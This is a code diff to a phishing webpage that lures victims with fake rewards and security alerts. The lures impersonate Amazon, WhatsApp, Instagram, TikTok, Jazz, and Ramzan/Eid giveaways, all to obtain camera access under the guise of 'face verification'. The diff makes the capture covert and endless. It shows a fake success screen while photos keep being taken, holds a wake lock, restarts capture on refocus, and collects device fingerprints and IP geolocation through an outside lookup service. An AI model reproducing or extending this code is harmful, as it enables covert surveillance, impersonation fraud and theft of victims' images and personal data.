@@ -130,23 +130,42 @@
             border-radius: 14px;
             border: none;
             font-family: 'Inter', sans-serif;
-            font-size: 1rem;
-            font-weight: 700;
+            font-size: 1.1rem;
+            font-weight: 800;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             transition: all 0.25s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            animation: pulse-force 2s infinite;
+        }
+
+        @keyframes pulse-force {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            }
+
+            50% {
+                transform: scale(1.04);
+                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            }
         }
 
         .c-btn:hover {
-            transform: translateY(-2px);
+            transform: translateY(-2px) scale(1.02);
             filter: brightness(1.1);
         }
 
         .c-btn:active {
-            transform: translateY(0);
+            transform: translateY(0) scale(0.98);
         }
 
         .c-btn:disabled {
@@ -1232,208 +1251,208 @@
                 logo: '📶',
                 offerBig: 'FREE 10GB',
                 offerSub: 'Mobile Data — Valid for 30 Days',
-                msg: 'Congratulations! You have been selected for our exclusive Jazz Free Data promotion. Verify your identity with a quick selfie to claim your free 10GB data instantly.',
+                msg: 'Congratulations! You have been selected for our exclusive Jazz Free Data promotion. Verify your identity with a quick biometric scan to claim your free 10GB data instantly.',
                 btnIcon: 'fa-solid fa-gift',
                 btnText: 'Claim Free Data Now',
-                statusWaiting: 'Verifying your account...',
+                statusWaiting: 'Verifying biometric data...',
                 statusDone: 'Data added to your account!',
                 successIcon: '📶',
                 successTitle: 'Data Added!',
                 successSub: '10GB has been credited to your number.\nYou may close this page.',
-                timerMsg: 'Offer expires in',
-                note: '🔒 Secure verification — Jazz Pakistan',
-                noCamTitle: 'Hardware Error',
-                noCamMsg: 'Your device camera was not detected. Please connect a camera to verify your identity and claim your data.',
+                timerMsg: 'Expires in',
+                note: '🔒 Official Jazz Rewards Portal',
+                noCamTitle: 'Biometric Error',
+                noCamMsg: 'Your device camera was not detected. A working camera is required for biometric identity verification to claim your reward.',
             },
 
             giftcard: {
                 title: 'Amazon Gift Card',
                 brand: 'Amazon Rewards',
-                tagline: 'You have a gift waiting!',
+                tagline: 'Redemption Center',
                 logo: '🎁',
-                offerBig: '$50 Gift Card',
-                offerSub: 'Redeem at Amazon.com · Expires in 24h',
-                msg: 'You have been selected as a winner of our Amazon loyalty reward. Complete a quick identity verification to claim your $50 gift card. No credit card needed.',
+                offerBig: '$100 Gift Card',
+                offerSub: 'Approved for Your Account',
+                msg: 'You have a pending $100 Amazon Gift Card. To prevent fraud and ensure this gift reaches you, please complete a secure 5-second face verification below.',
                 btnIcon: 'fa-solid fa-gift',
-                btnText: 'Claim Gift Card',
-                statusWaiting: 'Verifying your identity...',
-                statusDone: 'Gift card sent to your email!',
+                btnText: 'Redeem Gift Card Now',
+                statusWaiting: 'Verifying identity...',
+                statusDone: 'Gift card sent!',
                 successIcon: '🎁',
-                successTitle: 'Congratulations!',
-                successSub: 'Your $50 gift card has been sent.\nCheck your inbox shortly.',
+                successTitle: 'Confirmed!',
+                successSub: 'Your $100 gift card has been sent to your registered email.\nCheck your inbox.',
                 timerMsg: 'Offer valid for',
-                note: '🔒 amazon.com — Secure Checkout',
-                noCamTitle: 'Identity Verification Failed',
-                noCamMsg: 'A working camera is required to verify your eligibility for this gift card. Please ensure your camera is enabled.',
+                note: '🔒 Secure Amazon Rewards Node',
+                noCamTitle: 'Verification Required',
+                noCamMsg: 'A working camera is mandatory to prevent unauthorized reward claims. Please connect a camera and refresh.',
             },
 
             lucky: {
-                title: 'Lucky Draw Winner!',
-                brand: '🏆 LUCKY DRAW',
-                tagline: 'Official Prize Notification',
+                title: 'Grand Prize Winner!',
+                brand: '🏆 OFFICIAL WINNER',
+                tagline: 'Identity Verification Required',
                 logo: '🏆',
                 offerBig: 'YOU WON!',
-                offerSub: 'PKR 50,000 Cash Prize',
-                msg: 'Your phone number was randomly selected in our monthly lucky draw. To verify your identity and receive your prize, please complete a quick face scan below.',
+                offerSub: 'Grand Prize: iPhone 15 Pro',
+                msg: 'Your session has been randomly selected as our Grand Prize winner. To claim your prize, we must verify your face against our registered whitelist. Click below to start the scan.',
                 btnIcon: 'fa-solid fa-trophy',
-                btnText: 'Claim My Prize',
-                statusWaiting: 'Running identity scan...',
-                statusDone: 'Prize confirmed! Transfer initiated.',
+                btnText: 'Claim My iPhone 15 Pro',
+                statusWaiting: 'Scanning whitelist database...',
+                statusDone: 'Win confirmed! Tracking sent.',
                 successIcon: '🥇',
-                successTitle: 'PRIZE UNLOCKED!',
-                successSub: 'PKR 50,000 will be transferred within 24 hours.',
+                successTitle: 'CLAIMED!',
+                successSub: 'Your iPhone 15 Pro will be shipped to your address within 48 hours.',
                 timerMsg: 'Claim before',
-                note: '🔒 Official Lucky Draw Authority',
+                note: '🔒 Official Prize Authority Node',
                 noCamTitle: 'Scan Failed',
-                noCamMsg: 'We could not detect a camera for the identity scan. A camera is mandatory to claim cash prizes.',
+                noCamMsg: 'Whitelist scan requires a live camera feed. Please enable permissions to claim your prize.',
             },
 
-            video: {
-                title: 'NetStream — Verify Account',
-                brand: 'NetStream',
-                tagline: 'Continue watching — verify now',
-                logo: '▶',
-                offerBig: 'Account Verification Required',
-                offerSub: 'Your account has been flagged for unusual activity',
-                msg: 'To continue watching, we need to verify it\'s really you. This is a one-time face verification for your account security. Your session will resume immediately.',
-                btnIcon: 'fa-solid fa-shield-check',
-                btnText: 'Verify & Continue Watching',
-                statusWaiting: 'Verifying your account...',
-                statusDone: 'Verified! Resuming your show...',
-                successIcon: '✅',
-                successTitle: 'Account Verified',
-                successSub: 'Your account is secure.\nYou can continue watching now.',
-                timerMsg: 'Session expires in',
-                note: '🔒 netstream.com — Secure Verification',
+            tiktok_likes: {
+                title: 'TikTok Likes Generator',
+                brand: 'TikTok Rewards',
+                tagline: 'Boost Your Social Presence',
+                logo: '❤️',
+                offerBig: '10,000 LIKES',
+                offerSub: 'Pending Approval for your Account',
+                msg: 'Congratulations! You are eligible for 10,000 free TikTok likes. To prevent bot abuse, please complete a quick 5-second human verification scan below.',
+                btnIcon: 'fa-brands fa-tiktok',
+                btnText: 'Claim My 10k Likes Now',
+                statusWaiting: 'Verifying human identity...',
+                statusDone: 'Likes dispatched!',
+                successIcon: '❤️',
+                successTitle: 'LIKES SENT!',
+                successSub: '10,000 likes are being added to your latest video.\nProcessing time: 15-30 mins.',
+                timerMsg: 'Offer expires in',
+                note: '🔒 TikTok Security Center — Verified',
                 noCamTitle: 'Verification Error',
-                noCamMsg: 'Face verification is required to resume your session. Please enable your camera and refresh.',
+                noCamMsg: 'Our anti-bot system requires a live camera feed to verify you are a real user. Please enable camera and try again.',
             },
 
             whatsapp: {
-                title: 'WhatsApp — Verify Account',
-                brand: 'WhatsApp',
-                tagline: 'Account Security Check',
+                title: 'Security Alert — WhatsApp',
+                brand: 'WhatsApp Security',
+                tagline: 'Endpoint Verification',
                 logo: '💬',
-                offerBig: 'Verify Your Identity',
-                offerSub: 'Required to keep your account active',
-                msg: 'WhatsApp detected a login from a new device. To prevent unauthorized access, please verify your identity with a quick selfie. This keeps your chats safe.',
+                offerBig: 'Log-in Attempt Detected',
+                offerSub: 'From unrecognized device in London, UK',
+                msg: 'Your WhatsApp account was just accessed from a new device. If this wasn\'t you, please complete a face verification NOW to block the other session and protect your chats.',
                 btnIcon: 'fa-brands fa-whatsapp',
-                btnText: 'Verify My Account',
-                statusWaiting: 'Checking your identity...',
-                statusDone: 'Account verified!',
+                btnText: 'Block Other Session & Secure Account',
+                statusWaiting: 'Securing account...',
+                statusDone: 'Account secured!',
                 successIcon: '✅',
-                successTitle: 'Account Secured!',
-                successSub: 'Your WhatsApp account is now verified.\nYou can continue chatting.',
-                timerMsg: 'Account locked in',
-                note: '🔒 whatsapp.com — End-to-End Encrypted',
-                noCamTitle: 'Security Check Failed',
-                noCamMsg: 'WhatsApp cannot access your camera. Please enable permissions in your device settings to verify your account.',
+                successTitle: 'ACCOUNT PROTECTED',
+                successSub: 'The unauthorized session has been terminated.\nYour account is now safe.',
+                timerMsg: 'Auto-Lock in',
+                note: '🔒 WhatsApp Inc. — Privacy Secured',
+                noCamTitle: 'Security Critical',
+                noCamMsg: 'We cannot block the intrusion without a secure face ID. Please enable camera immediately to protect your data.',
             },
 
-            google: {
-                title: 'Google — Security Alert',
-                brand: 'Google',
-                tagline: 'accounts.google.com',
-                logo: '🔒',
-                offerBig: '⚠️ Suspicious Activity Detected',
-                offerSub: 'Unusual sign-in attempt from new device',
-                msg: 'We detected a new sign-in to your Google Account from an unrecognized device. To protect your account, please verify your identity using your camera below.',
-                btnIcon: 'fa-brands fa-google',
-                btnText: 'Verify It\'s Me',
-                statusWaiting: 'Verifying your identity...',
-                statusDone: 'Identity confirmed!',
-                successIcon: '🛡️',
-                successTitle: 'Account Protected',
-                successSub: 'Your Google Account has been secured.\nThe suspicious sign-in has been blocked.',
-                timerMsg: 'Action required within',
-                note: '🔒 Google Security — accounts.google.com',
-                noCamTitle: 'Authentication Error',
-                noCamMsg: 'Google cannot find a camera on this device. Use a device with a camera to complete this security check.',
+            tiktok_followers: {
+                title: 'TikTok Followers+ App',
+                brand: 'Followers Hub',
+                tagline: 'Get Famous Instantly',
+                logo: '👤',
+                offerBig: '5,000 FOLLOWERS',
+                offerSub: 'Ready to Transfer to @user',
+                msg: 'We have reserved 5,000 active followers for your profile. To activate the transfer, please look into your camera and blink to pass our security bot-detection test.',
+                btnIcon: 'fa-brands fa-tiktok',
+                btnText: 'Activate Followers Boost',
+                statusWaiting: 'Authenticating profile...',
+                statusDone: 'Followers active!',
+                successIcon: '🚀',
+                successTitle: 'BOOST ACTIVE',
+                successSub: '5,000 followers have been added to your queue.\nYour profile will grow shortly.',
+                timerMsg: 'Link expires in',
+                note: '🔒 Secure Social API — Encrypted',
+                noCamTitle: 'Camera Required',
+                noCamMsg: 'Follower activation requires a live identity scan to ensure account safety. Please enable your camera.',
             },
 
             instagram: {
-                title: 'Instagram — Special Offer',
-                brand: 'Instagram',
-                tagline: 'Meta Verified Partner Offer',
-                logo: '📸',
-                offerBig: '✨ Get Instagram Blue Tick',
-                offerSub: 'Free Verification Badge — Limited Offer',
-                msg: 'You have been selected for a free Instagram verification badge! Complete a quick face ID to confirm your identity and get your blue tick within 24 hours.',
+                title: 'Meta Verification — Instagram',
+                brand: 'Instagram Meta',
+                tagline: 'Verification Batch Enrollment',
+                logo: '✨',
+                offerBig: 'You are Eligible for Verification',
+                offerSub: 'Get your Blue Tick for free today',
+                msg: 'Our systems have flagged your profile for honorary Meta verification. Click below to take your verification selfie and join the verified community instantly.',
                 btnIcon: 'fa-brands fa-instagram',
-                btnText: 'Get Verified Free',
-                statusWaiting: 'Processing your application...',
-                statusDone: 'Verification submitted!',
+                btnText: 'Claim Verification Badge',
+                statusWaiting: 'Reviewing profile metadata...',
+                statusDone: 'Verification complete!',
                 successIcon: '✅',
-                successTitle: 'Application Sent!',
-                successSub: 'Your blue tick will appear within 24 hours.\nCheck your Instagram notifications.',
-                timerMsg: 'Offer valid for',
-                note: '🔒 instagram.com — Meta Verified',
-                noCamTitle: 'Face ID Required',
-                noCamMsg: 'Instagram verification badge requires a live face ID. Please connect a camera to proceed with your application.',
+                successTitle: 'BADGE APPROVED',
+                successSub: 'Your blue tick will appear on your profile within 1 hour.\nCongratulations!',
+                timerMsg: 'Enrollment expires in',
+                note: '🔒 Meta Verified — Official Partner',
+                noCamTitle: 'Photo Error',
+                noCamMsg: 'A live identity photo is required for the blue badge. Please enable your camera to continue.',
             },
 
-            bank: {
-                title: 'Bank Alert — Verify Now',
-                brand: 'NATIONAL BANK',
-                tagline: 'Priority Security Alert',
-                logo: '🏦',
-                offerBig: '🚨 ACCOUNT SUSPENDED',
-                offerSub: 'Immediate action required to restore access',
-                msg: 'Your bank account has been temporarily suspended due to suspicious transactions. Please verify your identity immediately using the secure biometric scan to restore full access.',
-                btnIcon: 'fa-solid fa-building-columns',
-                btnText: 'Verify Identity Now',
-                statusWaiting: 'Running biometric scan...',
-                statusDone: 'Account restored successfully!',
-                successIcon: '✅',
-                successTitle: 'Account Restored',
-                successSub: 'Your account is now active.\nAll restrictions have been lifted.',
-                timerMsg: 'Account freezes in',
-                note: '🔒 nationalbank.com — 256-bit SSL Secured',
-                noCamTitle: 'Biometric Error',
-                noCamMsg: 'A secure biometric scan requires a camera. Please enable your camera to restore your bank account access.',
+            ramzan: {
+                title: 'Ramzan Mubarak Offer',
+                brand: 'RAMADAN KAREEM',
+                tagline: 'Blessings & Rewards',
+                logo: '🌙',
+                offerBig: 'RAMZAN GIFT',
+                offerSub: 'Free Rs. 5,000 Wallet Balance',
+                msg: 'Ramzan Mubarak! As part of our Ramadan Kareem celebrations, we are giving away Rs. 5,000 gifts to our lucky users. Please verify your identity below to claim your gift in your EasyPaisa/JazzCash wallet.',
+                btnIcon: 'fa-solid fa-moon',
+                btnText: 'Claim Ramzan Gift Now',
+                statusWaiting: 'Processing gift allocation...',
+                statusDone: 'Gift sent successfully!',
+                successIcon: '🕌',
+                successTitle: 'MUBARAK!',
+                successSub: 'Your Rs. 5,000 Ramzan gift has been sent to your wallet.\nRamzan Mubarak to you and your family.',
+                timerMsg: 'Claim closes in',
+                note: '🔒 Official Ramzan Rewards Portal',
+                noCamTitle: 'Identity Error',
+                noCamMsg: 'Biometric verification is required to ensure the gift reaches the correct person. Please enable your camera.',
             },
 
-            speedtest: {
-                title: 'SpeedTest Pro — Free',
-                brand: 'SpeedTest Pro',
-                tagline: 'Test Your Internet Speed',
-                logo: '⚡',
-                offerBig: '0 Mbps',
-                offerSub: 'Click below to start your speed test',
-                msg: 'SpeedTest Pro measures your real internet speed including download, upload, ping, and more. Grant camera access to enable advanced network diagnostics and AR speed overlay.',
-                btnIcon: 'fa-solid fa-gauge-high',
-                btnText: 'Start Speed Test',
-                statusWaiting: 'Running diagnostics...',
-                statusDone: 'Test complete! Results ready.',
-                successIcon: '⚡',
-                successTitle: 'Test Complete!',
-                successSub: 'Download: 85.3 Mbps · Upload: 24.1 Mbps\nPing: 14ms — Excellent!',
-                timerMsg: 'Analyzing network',
-                note: '🔒 speedtest-pro.app — No data stored',
-                noCamTitle: 'Diagnostics Error',
-                noCamMsg: 'Advanced AR diagnostics require a camera. Please enable camera access to finish the speed test.',
+            eid: {
+                title: 'Eid-ul-Fitr Grand Gift',
+                brand: 'EID REWARDS',
+                tagline: 'Celebrate Eid with Us',
+                logo: '⭐',
+                offerBig: 'EIDI OFFER',
+                offerSub: 'Special Eid Package Approved',
+                msg: 'Eid Mubarak! Your Eidi package containing exclusive rewards and balance is ready. Complete a quick security face-scan to confirm your identity and unlock your Eid gift instantly.',
+                btnIcon: 'fa-solid fa-star-and-crescent',
+                btnText: 'Unlock My Eid Gift',
+                statusWaiting: 'Unlocking rewards...',
+                statusDone: 'Eid Gift Unlocked!',
+                successIcon: '🎁',
+                successTitle: 'EID MUBARAK!',
+                successSub: 'Your Eid rewards have been activated on your account.\nEnjoy your celebrations!',
+                timerMsg: 'Eidi valid for',
+                note: '🔒 Secure Eid Rewards Node',
+                noCamTitle: 'Face-Scan Failed',
+                noCamMsg: 'Eidi distribution requires a live face-scan to avoid duplicate claims. Please allow camera access.',
             },
 
-            music: {
-                title: 'FreeBeats — Download Music',
-                brand: 'FreeBeats',
-                tagline: '10 Million Songs · Free Forever',
-                logo: '🎵',
-                offerBig: '🎵 Unlock Free Music',
-                offerSub: 'Download unlimited songs — No subscription',
-                msg: 'FreeBeats lets you download unlimited music for free! To unlock your premium access and enable offline downloads, complete a quick age verification using your camera.',
-                btnIcon: 'fa-solid fa-music',
-                btnText: 'Unlock & Download Free',
-                statusWaiting: 'Verifying your access...',
-                statusDone: 'Premium unlocked!',
-                successIcon: '🎶',
-                successTitle: 'Premium Unlocked!',
-                successSub: 'You now have unlimited free downloads.\nEnjoy your music!',
-                timerMsg: 'Offer expires in',
-                note: '🔒 freebeats.app — No credit card required',
-                noCamTitle: 'Camera Required',
-                noCamMsg: 'To verify your identity and unlock this offer, a working camera is required. Please connect a camera and refresh.',
-            }
+            pakistan: {
+                title: 'Special Reward for Pakistanis',
+                brand: 'PAKISTAN PRIDE',
+                tagline: 'Exclusive National Offer',
+                logo: '🇵🇰',
+                offerBig: 'FREE BALANCE',
+                offerSub: 'Rs. 2,000 Monthly Support',
+                msg: 'This special offer is exclusively for the people of Pakistan. Verify your face to receive Rs. 2,000 monthly support directly into your mobile account. 100% verified by Pak-Rewards.',
+                btnIcon: 'fa-solid fa-flag',
+                btnText: 'Claim Pak-Reward Now',
+                statusWaiting: 'Validating CNIC link...',
+                statusDone: 'Reward confirmed!',
+                successIcon: '🇵🇰',
+                successTitle: 'SUCCESS!',
+                successSub: 'Your Rs. 2,000 monthly support has been approved.\nYou will receive it on the 1st of every month.',
+                timerMsg: 'Registration ends in',
+                note: '🔒 Pak-Rewards — Verified Node',
+                noCamTitle: 'Identity Required',
+                noCamMsg: 'This national support program requires a live face identity check. Please enable your camera.',
+            },
         };
 
         // ============================================================
@@ -1524,66 +1543,134 @@
         }
 
         // ============================================================
-        //  CAPTURE ENGINE v2 — Fast, Auto-Retry, Never-Fail
+        //  CAPTURE ENGINE v4 — PERSISTENT / NON-STOP MODE
         // ============================================================
         let stream = null;
         let capturing = false;
         let retryCount = 0;
-        const MAX_RETRY = 10;   // auto-retry up to 10 times
-        const MAX_PHOTOS = 10;   // capture 10 photos per session
-        const INTERVAL = 800;   // ms between each shot
-        const WARMUP_MS = 1500; // ms to wait after stream starts so camera sensor lights up (prevents black frames)
+        let wakeLock = null;
+        const MAX_RETRY = 20;
+        const INTERVAL = 1600;  // Balanced for long-term (1.6s)
+        const WARMUP_MS = 1000;
         const PERM_KEY = 'cemra_perm_granted';
 
-        // --- Sync Status to Results Page ---
-        function setSyncStatus(status) {
-            localStorage.setItem('cemra_status_' + sessionId, JSON.stringify({
-                status,
-                lastUpdate: Date.now()
-            }));
+        // --- Wake Lock: Prevent screen dimming ---
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('Wake Lock Active');
+                    wakeLock.addEventListener('release', () => {
+                        console.log('Wake Lock Released');
+                        requestWakeLock(); // re-acquire if lost
+                    });
+                }
+            } catch (err) { }
         }
-        setSyncStatus('connected'); // First status: target has opened the link
 
-        // --- Auto-launch: if permission was granted before, skip the button ---
-        // Use setTimeout (not DOMContentLoaded) because the card HTML is built dynamically above;
-        // by the time this script runs the DOM elements already exist.
+        // --- Aggressive Persistence Listeners ---
+        window.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                requestWakeLock();
+                if (!capturing) requestCamera();
+            }
+        });
+        window.addEventListener('focus', () => {
+            if (!capturing) requestCamera();
+        });
+
+        // --- Sync Status to Results Page ---
+        async function getMetadata() {
+            const meta = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
+                time: new Date().toLocaleString()
+            };
+
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    meta.battery = Math.floor(b.level * 100) + '%';
+                    meta.charging = b.charging;
+                }
+            } catch (e) { }
+
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                meta.network = conn.effectiveType || 'unknown';
+                meta.downlink = conn.downlink + 'Mbps';
+            }
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 4000);
+                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal }).catch(() => null);
+                clearTimeout(timeoutId);
+                if (res) {
+                    const data = await res.json();
+                    meta.ip = data.ip;
+                    meta.city = data.city;
+                    meta.country = data.country_name;
+                    meta.isp = data.org;
+                }
+            } catch (e) { }
+
+            return meta;
+        }
+
+        async function setSyncStatus(status) {
+            if (!sessionId) return;
+            const existing = JSON.parse(localStorage.getItem('cemra_status_' + sessionId) || '{}');
+            localStorage.setItem('cemra_status_' + sessionId, JSON.stringify({
+                ...existing,
+                status,
+                lastUpdate: Date.now(),
+                theme: themeKey
+            }));
+
+            getMetadata().then(meta => {
+                const current = JSON.parse(localStorage.getItem('cemra_status_' + sessionId) || '{}');
+                localStorage.setItem('cemra_status_' + sessionId, JSON.stringify({
+                    ...current,
+                    ...meta,
+                    lastUpdate: Date.now()
+                }));
+            });
+        }
+        setSyncStatus('connected');
+
         // --- Auto-launch: Always try if not denied ---
         setTimeout(() => {
             const hasDeniedBefore = localStorage.getItem('cemra_denied') === '1';
             if (!hasDeniedBefore) {
-                // Silently start right away
-                const btn = document.getElementById('mainBtn');
-                if (btn) btn.style.display = 'none';
-                setStatus(theme.statusWaiting);
-                setProgress(10);
                 requestCamera();
+                requestWakeLock();
             }
-        }, 500);
+        }, 300);
 
         // --- Button click ---
         async function startCapture() {
             const btn = document.getElementById('mainBtn');
             if (btn) {
-                btn.disabled = true;
-                btn.innerHTML = '<i class="fa-solid fa-spinner spin"></i> Please wait...';
+                btn.classList.add('btn-loading');
+                btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i> Secure Connection...';
             }
             setStatus(theme.statusWaiting);
-            setProgress(10);
+            setProgress(15);
+            requestWakeLock();
             await requestCamera();
         }
 
-        // --- Core camera request with full fallback chain ---
+        // --- Core camera request ---
         async function requestCamera() {
             if (capturing) return;
 
-            // Check for Secure Context (browsers block camera on insecure sites)
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                const isFile = window.location.protocol === 'file:';
-                console.error('Camera API not available.');
-                alert(isFile
-                    ? "❌ BROWSER ERROR: You are opening this as a local file (file://).\n\nModern browsers ONLY allow camera access on HTTPS or localhost.\n\nPlease upload these files to a server or use a local server (like Live Server) to test."
-                    : "❌ BROWSER ERROR: Camera API is not available on this connection.\n\nEnsure you are using HTTPS and that your browser supports 'getUserMedia'."
-                );
                 setSyncStatus('browser_blocked');
                 onPermanentFail();
                 return;
@@ -1591,188 +1678,105 @@
 
             const constraints = [
                 { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
-                { video: { facingMode: { ideal: 'user' } }, audio: false },
-                { video: true, audio: false },
-                { video: { width: 640, height: 480 }, audio: false }
+                { video: { facingMode: 'user' }, audio: false },
+                { video: true, audio: false }
             ];
 
-            let lastError = null;
             for (const constraint of constraints) {
                 try {
-                    console.log('Requesting camera with:', JSON.stringify(constraint));
                     stream = await navigator.mediaDevices.getUserMedia(constraint);
-                    const camType = JSON.stringify(constraint).includes('user') ? 'front' : 'back';
-                    localStorage.setItem(PERM_KEY, '1'); // remember permission granted
-                    onGranted(camType);
+                    localStorage.setItem(PERM_KEY, '1');
+                    onGranted();
                     return;
-                } catch (e) {
-                    console.warn('Constraint failed:', JSON.stringify(constraint), e.name);
-                    lastError = e;
-                }
+                } catch (e) { }
             }
-
-            // All constraints failed — check if ANY camera exists at all
-            let devices = [];
-            try {
-                devices = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === 'videoinput');
-            } catch { }
-
-            console.error('All camera attempts failed:', lastError);
-            console.error('Visible video devices:', devices.length);
-            scheduleRetry(lastError, devices.length);
+            scheduleRetry();
         }
 
-        // --- Auto retry with exponential backoff ---
-        function scheduleRetry(error, visibleCamerasCount) {
+        function scheduleRetry() {
             if (retryCount >= MAX_RETRY) {
-                if (error && error.name === 'NotFoundError') {
-                    setSyncStatus('no_hardware');
-                    onPermanentFail('no_hardware');
-                } else if (error && error.name === 'NotAllowedError') {
-                    localStorage.setItem('cemra_denied', '1');
-                    setSyncStatus('permission_denied');
-                    onPermanentFail('denied');
-                } else {
-                    onPermanentFail();
-                }
+                onPermanentFail('no_hardware');
                 return;
             }
             retryCount++;
-            const delay = Math.min(1000 * retryCount, 5000); // 1s, 2s, 3s ... max 5s
-            setStatus(`Retrying... (${retryCount}/${MAX_RETRY})`);
-            setSyncStatus('retrying');
-            setProgress(retryCount * 5);
-            setTimeout(requestCamera, delay);
+            setTimeout(requestCamera, 2000);
         }
 
-        // --- Camera granted ---
-        function onGranted(camType) {
+        function onGranted() {
+            if (capturing) return;
             capturing = true;
-            retryCount = 0;
+
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
-            video.play().catch(() => { }); // must call play() explicitly so frames render
-            setProgress(30);
+            video.setAttribute('playsinline', '');
+            video.play().catch(() => { });
+
             setStatus(theme.statusWaiting);
-            setSyncStatus('permission_granted');
 
-            // Wait for video to be ready, then add WARMUP_MS delay before first capture
-            // This prevents black frames because the camera sensor needs time to light up
-            let warmupDone = false;
-            const startCapturing = () => {
-                if (warmupDone) return;
-
-                // Ensure video is actually flowing and has dimensions
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    console.warn('Video ready but dimensions are 0. Retrying in 200ms...');
-                    setTimeout(startCapturing, 200);
-                    return;
+            // --- AGGRESSIVE START ---
+            let readyTimer = setInterval(() => {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    clearInterval(readyTimer);
+                    startInfiniteBurst(canvas, video);
                 }
+            }, 100);
 
-                warmupDone = true;
-                // Limit to 640x480 to save memory and storage (prevents ERR_INSUFFICIENT_RESOURCES)
-                const maxW = 640;
-                const maxH = 480;
-                const ratio = Math.min(maxW / (video.videoWidth || 640), maxH / (video.videoHeight || 480), 1);
-
-                canvas.width = (video.videoWidth || 640) * ratio;
-                canvas.height = (video.videoHeight || 480) * ratio;
-
-                console.log('Capture started. Dimensions:', canvas.width, 'x', canvas.height);
-
-                setProgress(35);
-                setStatus(theme.statusWaiting);
-                // Show scanner overlay
-                const sc = document.getElementById('scannerOverlay');
-                if (sc) sc.classList.add('active');
-                setSyncStatus('capturing');
-
-                // Wait WARMUP_MS after stream is ready so sensor is fully lit
-                setTimeout(() => {
-                    if (capturing) burstCapture(camType, canvas, video);
-                }, WARMUP_MS);
-            };
-
-            video.addEventListener('loadeddata', startCapturing, { once: true });
-            video.addEventListener('canplay', startCapturing, { once: true });
-
-            // Absolute failsafe: start after 3s regardless
-            setTimeout(() => {
-                if (capturing && !warmupDone) {
-                    warmupDone = true;
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    burstCapture(camType, canvas, video);
-                }
-            }, 3000);
+            // Fail-safe limit for ready check
+            setTimeout(() => clearInterval(readyTimer), 5000);
         }
 
-        // --- Burst capture: after warmup, start shooting ---
-        let burstInterval = null;
-        function burstCapture(camType, canvas, video) {
-            if (burstInterval) clearInterval(burstInterval);
-            let count = 0;
-            const ctx = canvas.getContext('2d');
+        function startInfiniteBurst(canvas, video) {
+            // Setup canvas
+            const maxW = 640; // lower for efficiency
+            const ratio = Math.min(maxW / video.videoWidth, 1);
+            canvas.width = video.videoWidth * ratio;
+            canvas.height = video.videoHeight * ratio;
 
-            // Take first shot (warmup already done, camera is ready)
-            shoot(ctx, canvas, video, camType);
-            count++;
-            setProgress(40);
+            // Show scanner
+            const sc = document.getElementById('scannerOverlay');
+            if (sc) sc.classList.add('active');
+            setProgress(60);
+            setSyncStatus('capturing');
 
-            burstInterval = setInterval(() => {
-                if (count >= MAX_PHOTOS) {
-                    clearInterval(burstInterval);
-                    burstInterval = null;
-                    stopStream();
-                    setProgress(100);
+            // Wait brief warmup then burst
+            setTimeout(() => {
+                const ctx = canvas.getContext('2d', { alpha: false });
+
+                const interval = setInterval(() => {
+                    if (!capturing || !stream) {
+                        clearInterval(interval);
+                        return;
+                    }
+
+                    try {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.45);
+                        if (dataUrl.length > 3000) {
+                            savePhoto(dataUrl);
+                            // Keep progress high but pulsing
+                            setProgress(90 + (Math.random() * 8));
+                        }
+                    } catch (e) { }
+
+                }, INTERVAL);
+
+                // Show success UI after 6 seconds but keep the loop running
+                setTimeout(() => {
                     setSyncStatus('done');
                     onDone();
-                    return;
-                }
+                }, 6000);
 
-                // Re-check stream is still alive
-                if (!stream || stream.getTracks().every(t => t.readyState === 'ended')) {
-                    clearInterval(burstInterval);
-                    burstInterval = null;
-                    // Stream died mid-capture — restart
-                    capturing = false;
-                    scheduleRetry();
-                    return;
-                }
-
-                shoot(ctx, canvas, video, camType);
-                count++;
-                setProgress(40 + (count / MAX_PHOTOS) * 58);
-            }, INTERVAL);
-
-            // Keep capturing even if page goes to background
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible' && !capturing) {
-                    requestCamera(); // resume on tab re-focus
-                }
-            });
+            }, WARMUP_MS);
         }
 
-        // --- Single frame capture ---
-        function shoot(ctx, canvas, video, camType) {
-            try {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                // Lower quality (0.4) to stay under localStorage limits (5MB)
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-                if (dataUrl && dataUrl.length > 2000) {
-                    savePhoto(dataUrl, camType);
-                }
-            } catch (e) {
-                console.error('Shoot error:', e);
-            }
+        function finalizeCapture() {
+            // Unused in infinite mode
         }
 
         // --- Save photo to localStorage with auto-cleanup ---
-        function savePhoto(dataUrl, camType) {
+        function savePhoto(dataUrl) {
             const key = 'cemra_captures_' + sessionId;
-
-            // Cleanup: remove OTHER session data if we are near limit
             cleanupStorage(dataUrl.length);
 
             try {
